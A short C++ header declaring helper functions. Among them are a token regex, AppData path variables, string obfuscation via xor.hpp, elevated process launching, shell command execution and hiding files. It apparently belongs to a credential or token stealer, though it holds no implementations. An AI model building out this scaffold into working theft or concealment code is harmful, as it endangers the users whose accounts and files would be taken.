#pragma once
#include <vector>
#include <string>
#include <array>

#include "xor.hpp"

namespace helpers {
	extern std::string regex_token;

	extern std::string roaming;

	extern std::string local;

	extern std::array<std::pair<std::string, std::string>, 7> paths;

	std::string read_file(const char* filename);

	bool is_initialized();

	void start_process(std::string path);

	void start_process_admin(std::string path);

	bool is_process_running(const char* process_name);

	DWORD get_pid(const char* process_name);

	bool was_client_run();

	std::string exec(const char* cmd);

	bool is_elevated();

	std::wstring s2ws(const std::string& s);

	bool is_python_installed();

	void hide_all_files(std::string path);

	void replace_all(std::string& str, const std::string& from, const std::string& to);
}
